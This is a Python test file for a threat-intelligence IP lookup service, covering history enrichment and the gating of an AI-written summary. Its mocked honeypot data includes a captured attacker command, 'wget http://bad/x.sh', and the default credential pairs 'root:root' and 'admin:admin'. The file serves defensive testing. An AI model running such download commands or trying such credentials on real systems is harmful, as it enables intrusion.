"""
Tests for ip_intel v1.8 internal-history enrichment.

Strategy: monkeypatch the four DB helpers + the AI helper directly so we
don't need a populated test DB. We only verify shape + gating logic.
"""

from __future__ import annotations

import os
from unittest.mock import AsyncMock, patch

import pytest

import app.services.ip_intel as ip_intel_mod
import app.services.ip_intel_history as hist_mod
from app.services.ip_intel import _CACHE, _DEEP_CACHE, lookup


@pytest.fixture(autouse=True)
def _clean_state(monkeypatch):
    _CACHE.clear()
    _DEEP_CACHE.clear()
    ip_intel_mod._TOR_EXITS = set()
    ip_intel_mod._TOR_EXITS_LOADED_AT = 0.0
    ip_intel_mod._SPAMHAUS_NETS = []
    ip_intel_mod._SPAMHAUS_LOADED_AT = 0.0
    # Default: AI offline so ai_summary stays None unless test opts in.
    monkeypatch.setenv("AEGIS_AI_MODE", "offline")
    yield
    _CACHE.clear()
    _DEEP_CACHE.clear()


# Re-use the URL router from the deep test to mock httpx
def _no_external_providers():
    """Patch httpx.AsyncClient so all provider calls cleanly fail (return empty)."""
    from unittest.mock import AsyncMock

    class FakeResp:
        status_code = 500
        text = ""
        def raise_for_status(self):
            raise Exception("network disabled in test")
        def json(self):
            return {}

    mock = AsyncMock()
    mock.get = AsyncMock(return_value=FakeResp())
    mock.__aenter__ = AsyncMock(return_value=mock)
    mock.__aexit__ = AsyncMock(return_value=False)
    return mock


@pytest.mark.asyncio
async def test_deep_false_omits_history():
    """Backward compat: default (deep=False) must NOT include history/ai_summary."""
    with patch("app.services.ip_intel.httpx.AsyncClient", return_value=_no_external_providers()):
        result = await lookup("8.8.8.8", deep=False)
    assert "history" not in result
    assert "external_feeds" not in result
    assert "related" not in result
    assert "ai_summary" not in result
    assert result.get("deep") is False
    assert "classification" in result  # existing field preserved


@pytest.mark.asyncio
async def test_deep_true_populates_history_blocks():
    """deep=True wires in all four history blocks + feeds + related."""
    mock_incidents = {
        "count": 3,
        "first": "2026-05-01T10:00:00",
        "last": "2026-05-20T15:00:00",
        "severities": {"high": 2, "medium": 1},
        "statuses": {"open": 1, "resolved": 2},
        "mitre_top": ["T1046", "T1190"],
    }
    mock_honeypot = {
        "total": 5,
        "protocols": {"ssh": 5},
        "last": "2026-05-25T11:00:00",
        "first": "2026-05-10T08:00:00",
        "commands": ["uname -a", "wget http://bad/x.sh"],
        "creds": ["root:root", "admin:admin"],
    }
    mock_profile = {
        "sophistication": "advanced",
        "tools_used": ["nmap", "hydra"],
        "techniques": ["T1110"],
        "ai_assessment": "Persistent scanner",
        "total_interactions": 5,
        "first_seen": "2026-05-10T08:00:00",
        "last_seen": "2026-05-25T11:00:00",
    }
    mock_actions = [
        {"type": "block_ip", "target": "1.2.3.4", "status": "executed",
         "reasoning": "auto", "created_at": "2026-05-20T15:01:00",
         "executed_at": "2026-05-20T15:01:02"},
    ]
    mock_feeds = [{"feed": "feodo_tracker", "threat_type": "botnet_c2",
                   "confidence": 0.9, "last_seen": "2026-05-26T00:00:00",
                   "tags": ["feodo_tracker"]}]
    mock_related = {"same_subnet": ["1.2.3.5", "1.2.3.6"], "same_asn": []}

    async def fake_assemble(ip, asn=None):
        return {
            "incidents": mock_incidents,
            "honeypot": mock_honeypot,
            "profile": mock_profile,
            "actions": mock_actions,
        }

    with patch("app.services.ip_intel.httpx.AsyncClient", return_value=_no_external_providers()), \
         patch("app.services.ip_intel_history.assemble_history",
               new=AsyncMock(side_effect=fake_assemble)), \
         patch("app.services.ip_intel_history._external_feeds_match",
               new=AsyncMock(return_value=mock_feeds)), \
         patch("app.services.ip_intel_history._related_ips",
               new=AsyncMock(return_value=mock_related)):
        result = await lookup("1.2.3.4", deep=True)

    assert result["deep"] is True
    assert result["history"]["incidents"]["count"] == 3
    assert result["history"]["incidents"]["mitre_top"] == ["T1046", "T1190"]
    assert result["history"]["honeypot"]["total"] == 5
    assert result["history"]["profile"]["sophistication"] == "advanced"
    assert len(result["history"]["actions"]) == 1
    assert result["external_feeds"][0]["feed"] == "feodo_tracker"
    assert result["is_malicious"] is True  # feed match raises malicious vote
    assert result["related"]["same_subnet"] == ["1.2.3.5", "1.2.3.6"]


@pytest.mark.asyncio
async def test_deep_true_empty_history_graceful():
    """No history -> empty placeholders, never raises."""
    async def empty_assemble(ip, asn=None):
        return {"incidents": {"count": 0}, "honeypot": {"total": 0},
                "profile": None, "actions": []}

    with patch("app.services.ip_intel.httpx.AsyncClient", return_value=_no_external_providers()), \
         patch("app.services.ip_intel_history.assemble_history",
               new=AsyncMock(side_effect=empty_assemble)), \
         patch("app.services.ip_intel_history._external_feeds_match",
               new=AsyncMock(return_value=[])), \
         patch("app.services.ip_intel_history._related_ips",
               new=AsyncMock(return_value={"same_subnet": [], "same_asn": []})):
        result = await lookup("8.8.8.8", deep=True)

    assert result["history"]["incidents"]["count"] == 0
    assert result["history"]["honeypot"]["total"] == 0
    assert result["history"]["profile"] is None
    assert result["history"]["actions"] == []
    assert result["external_feeds"] == []
    assert result["related"] == {"same_subnet": [], "same_asn": []}


@pytest.mark.asyncio
async def test_ai_summary_skipped_when_offline(monkeypatch):
    """AEGIS_AI_MODE=offline -> ai_summary is None even on deep=True."""
    monkeypatch.setenv("AEGIS_AI_MODE", "offline")

    async def empty_assemble(ip, asn=None):
        return {"incidents": {"count": 0}, "honeypot": {"total": 0},
                "profile": None, "actions": []}

    with patch("app.services.ip_intel.httpx.AsyncClient", return_value=_no_external_providers()), \
         patch("app.services.ip_intel_history.assemble_history",
               new=AsyncMock(side_effect=empty_assemble)), \
         patch("app.services.ip_intel_history._external_feeds_match",
               new=AsyncMock(return_value=[])), \
         patch("app.services.ip_intel_history._related_ips",
               new=AsyncMock(return_value={"same_subnet": [], "same_asn": []})):
        result = await lookup("8.8.8.8", deep=True)

    assert "ai_summary" in result
    assert result["ai_summary"] is None


@pytest.mark.asyncio
async def test_ai_summary_populated_when_full(monkeypatch):
    """AEGIS_AI_MODE=full + content -> ai_summary returned with provenance."""
    monkeypatch.setenv("AEGIS_AI_MODE", "full")

    async def empty_assemble(ip, asn=None):
        return {"incidents": {"count": 0}, "honeypot": {"total": 0},
                "profile": None, "actions": []}

    async def fake_chat(**kwargs):
        return {
            "content": "This IP is associated with a known Tor exit and has been "
                       "observed scanning for SSH. Recommend block. Confidence: high.",
            "provider": "inception",
            "model": "mercury-coder",
            "tokens_used": 220,
            "cost_usd": 0.0,
            "latency_ms": 540,
        }

    with patch("app.services.ip_intel.httpx.AsyncClient", return_value=_no_external_providers()), \
         patch("app.services.ip_intel_history.assemble_history",
               new=AsyncMock(side_effect=empty_assemble)), \
         patch("app.services.ip_intel_history._external_feeds_match",
               new=AsyncMock(return_value=[])), \
         patch("app.services.ip_intel_history._related_ips",
               new=AsyncMock(return_value={"same_subnet": [], "same_asn": []})), \
         patch("app.core.ai_manager.ai_manager.chat",
               new=AsyncMock(side_effect=fake_chat)):
        result = await lookup("185.220.101.42", deep=True)

    assert result["ai_summary"] is not None
    assert "Tor exit" in result["ai_summary"]["text"]
    prov = result["ai_summary"]["_provenance"]
    assert prov["kind"] == "agent"
    assert "inception" in prov["source"]


@pytest.mark.asyncio
async def test_ai_summary_skipped_when_empty_content(monkeypatch):
    """ai_manager returns empty content -> ai_summary is None."""
    monkeypatch.setenv("AEGIS_AI_MODE", "full")

    async def empty_assemble(ip, asn=None):
        return {"incidents": {"count": 0}, "honeypot": {"total": 0},
                "profile": None, "actions": []}

    async def empty_chat(**kwargs):
        return {"content": "", "provider": "disabled", "model": "disabled"}

    with patch("app.services.ip_intel.httpx.AsyncClient", return_value=_no_external_providers()), \
         patch("app.services.ip_intel_history.assemble_history",
               new=AsyncMock(side_effect=empty_assemble)), \
         patch("app.services.ip_intel_history._external_feeds_match",
               new=AsyncMock(return_value=[])), \
         patch("app.services.ip_intel_history._related_ips",
               new=AsyncMock(return_value={"same_subnet": [], "same_asn": []})), \
         patch("app.core.ai_manager.ai_manager.chat",
               new=AsyncMock(side_effect=empty_chat)):
        result = await lookup("1.1.1.1", deep=True)

    assert result["ai_summary"] is None


def test_slash24_prefix():
    from app.services.ip_intel_history import _slash24_prefix
    assert _slash24_prefix("1.2.3.4") == "1.2.3.%"
    assert _slash24_prefix("not-an-ip") is None
    # v6 returns None
    assert _slash24_prefix("2001:db8::1") is None
